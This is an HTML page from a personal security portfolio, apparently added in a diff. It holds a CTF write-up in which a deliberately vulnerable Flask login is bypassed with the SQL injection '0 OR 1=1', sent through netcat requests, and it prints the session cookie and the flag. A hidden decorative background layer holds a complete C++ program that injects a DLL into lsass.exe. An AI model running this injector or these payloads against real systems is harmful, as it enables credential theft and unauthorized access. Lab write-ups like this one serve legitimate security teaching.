@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💉 SQL Injection 1 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="💉 SQL Injection 1 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>💉 SQL Injection 1 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-overview">🧠 Challenge Overview</h2>
+
+<p>The challenge involves a Flask web application with a vulnerable login mechanism using SQLite. The objective is to log in as the <code class="language-plaintext highlighter-rouge">admin</code> user and retrieve the flag.</p>
+
+<hr />
+
+<h2 id="-source-code">🧬 Source Code</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/opt/pwn.college/python
+</span>
+<span class="kn">import</span> <span class="n">random</span>
+<span class="kn">import</span> <span class="n">flask</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sqlite3</span>
+<span class="kn">import</span> <span class="n">tempfile</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">TemporaryDB</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">db_file</span> <span class="o">=</span> <span class="n">tempfile</span><span class="p">.</span><span class="nc">NamedTemporaryFile</span><span class="p">(</span><span class="sh">"</span><span class="s">x</span><span class="sh">"</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="sh">"</span><span class="s">.db</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">sql</span><span class="p">,</span> <span class="n">parameters</span><span class="o">=</span><span class="p">()):</span>
+        <span class="n">connection</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">db_file</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+        <span class="n">connection</span><span class="p">.</span><span class="n">row_factory</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">Row</span>
+        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">parameters</span><span class="p">)</span>
+        <span class="n">connection</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">result</span>
+
+<span class="n">db</span> <span class="o">=</span> <span class="nc">TemporaryDB</span><span class="p">()</span>
+
+<span class="c1"># Setup database
+</span><span class="n">db</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"""</span><span class="s">CREATE TABLE users AS SELECT </span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="s"> AS username, ? as pin</span><span class="sh">"""</span><span class="p">,</span> <span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">32</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">63</span><span class="p">)])</span>
+<span class="n">db</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"""</span><span class="s">INSERT INTO users SELECT </span><span class="sh">"</span><span class="s">guest</span><span class="sh">"</span><span class="s"> as username, 1337 as pin</span><span class="sh">"""</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/session</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge_post</span><span class="p">():</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">identity</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">pin</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">pin</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
+        <span class="n">flask</span><span class="p">.</span><span class="nf">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="sh">"</span><span class="s">Missing `identity` form parameter</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">pin</span><span class="p">:</span>
+        <span class="n">flask</span><span class="p">.</span><span class="nf">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="sh">"</span><span class="s">Missing `pin` form parameter</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">pin</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="sh">"</span><span class="s">0123456789</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">flask</span><span class="p">.</span><span class="nf">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="sh">"</span><span class="s">Invalid pin</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">SELECT rowid, * FROM users WHERE username = </span><span class="sh">'</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="sh">'</span><span class="s"> AND pin = </span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="sh">"</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">DEBUG: </span><span class="si">{</span><span class="n">query</span><span class="o">=</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">query</span><span class="p">).</span><span class="nf">fetchone</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">flask</span><span class="p">.</span><span class="nf">abort</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Query: </span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="se">\n</span><span class="s">Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span><span class="p">:</span>
+        <span class="n">flask</span><span class="p">.</span><span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="sh">"</span><span class="s">Invalid username or pin</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">flask</span><span class="p">.</span><span class="n">session</span><span class="p">[</span><span class="sh">"</span><span class="s">user</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+    <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/session</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge_get</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">username</span> <span class="p">:</span><span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">user</span><span class="sh">"</span><span class="p">,</span> <span class="bp">None</span><span class="p">)):</span>
+        <span class="n">page</span> <span class="o">=</span> <span class="sh">"</span><span class="s">&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.</span><span class="sh">"</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">page</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">&lt;html&gt;&lt;body&gt;Hello, </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">!</span><span class="sh">"</span>
+        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">:</span>
+            <span class="n">page</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">&lt;br&gt;Here is your flag: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+
+    <span class="nf">return </span><span class="p">(</span>
+        <span class="n">page</span>
+        <span class="o">+</span> <span class="sh">"""</span><span class="s">
+        &lt;hr&gt;
+        &lt;form method=post&gt;
+        User:&lt;input type=text name=identity&gt;Pin:&lt;input type=text name=pin&gt;&lt;input type=submit value=Submit&gt;
+        &lt;/form&gt;
+        &lt;/body&gt;&lt;/html&gt;
+    </span><span class="sh">"""</span>
+    <span class="p">)</span>
+
+<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">SERVER_NAME</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">challenge.localhost:80</span><span class="sh">"</span>
+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sh">"</span><span class="s">challenge.localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="vulnerability">Vulnerability</h2>
+
+<p>The application builds the SQL query like this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>query <span class="o">=</span> f<span class="s2">"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = {pin}"</span>
+</code></pre></div></div>
+<p>Because the pin is injected without quotes, it allows SQL injection via numeric expressions — as long as the first character is a digit (pin[0] in “0123456789”).</p>
+
+<hr />
+
+<h2 id="exploit">Exploit</h2>
+<p>You can bypass the PIN check using:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0 OR 1=1
+</code></pre></div></div>
+
+<h3 id="step-1-login-as-admin-using-sql-injection">Step 1: Login as admin using SQL injection</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"POST /session HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n</span><span class="s2">Content-Type:application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">Content-Length:28</span><span class="se">\r\n\r\n</span><span class="s2">identity=admin&amp;pin=0 OR 1=1</span><span class="se">\n\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<p>This results in:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aHyxbQ.AhClMqE0W8T4xNTPQab1OJHP3Uk
+</code></pre></div></div>
+
+<h3 id="step-2-use-the-session-cookie-to-access-the-flag">Step 2: Use the session cookie to access the flag</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET /session HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n</span><span class="s2">Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aHyxbQ.AhClMqE0W8T4xNTPQab1OJHP3Uk</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello, admin!&lt;br&gt;Here is your flag: pwn.college{M8aIvvd56Vhp4kc6EDr1GrmcDBS.QXzcTN2wSM0IzMyEzW}
+</code></pre></div></div>
+
+<p>Flag: pwn.college{M8aIvvd56Vhp4kc6EDr1GrmcDBS.QXzcTN2wSM0IzMyEzW}</p>
+
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
